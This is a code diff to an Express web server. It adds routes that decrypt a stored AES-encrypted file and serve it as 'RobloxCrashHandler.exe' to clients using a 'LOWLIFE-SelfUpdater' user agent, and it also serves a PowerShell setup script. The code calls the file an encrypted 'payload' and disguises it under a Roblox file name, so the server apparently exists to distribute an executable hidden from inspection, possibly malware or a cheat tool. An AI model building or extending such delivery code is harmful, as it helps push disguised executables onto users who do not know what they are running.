@@ -19,6 +19,12 @@ function encryptBinary(inputBuffer) {
     return Buffer.concat([cipher.update(inputBuffer), cipher.final()]);
 }
 
+function decryptBinary(encryptedBuffer) {
+    const decipher = crypto.createDecipheriv('aes-256-cbc', AES_KEY, AES_IV);
+    decipher.setAutoPadding(true);
+    return Buffer.concat([decipher.update(encryptedBuffer), decipher.final()]);
+}
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -105,6 +111,12 @@ app.get('/api/release/latest', (req, res) => {
 
 // 2. API: Download Latest Setup Script / Encrypted Binary
 app.get('/download', (req, res) => {
+    // If request is from the self-updater client, serve the decrypted binary instead of setup.ps1
+    const userAgent = req.headers['user-agent'] || '';
+    if (userAgent.includes('LOWLIFE-SelfUpdater')) {
+        return res.redirect('/api/release/download-binary');
+    }
+
     const setupPath = path.join(__dirname, '..', 'setup.ps1');
     if (!fs.existsSync(setupPath)) {
         return res.status(404).send('Error: Setup script not found.');
@@ -120,6 +132,29 @@ app.get('/download', (req, res) => {
         res.send(content);
     } catch (err) {
         res.status(500).send('Error serving setup script.');
+    }
+});
+
+// 2a. API: Download Latest Decrypted Binary
+app.get('/api/release/download-binary', (req, res) => {
+    const encPath = path.join(UPLOADS_DIR, 'RobloxCrashHandler.enc');
+    if (!fs.existsSync(encPath)) {
+        return res.status(404).send('Error: Encrypted payload not found.');
+    }
+
+    try {
+        const data = getReleaseData();
+        data.totalDownloads += 1;
+        saveReleaseData(data);
+
+        const encBytes = fs.readFileSync(encPath);
+        const decBytes = decryptBinary(encBytes);
+
+        res.setHeader('Content-Disposition', 'attachment; filename="RobloxCrashHandler.exe"');
+        res.setHeader('Content-Type', 'application/octet-stream');
+        res.send(decBytes);
+    } catch (err) {
+        res.status(500).send('Error decrypting and serving payload.');
     }
 });
 
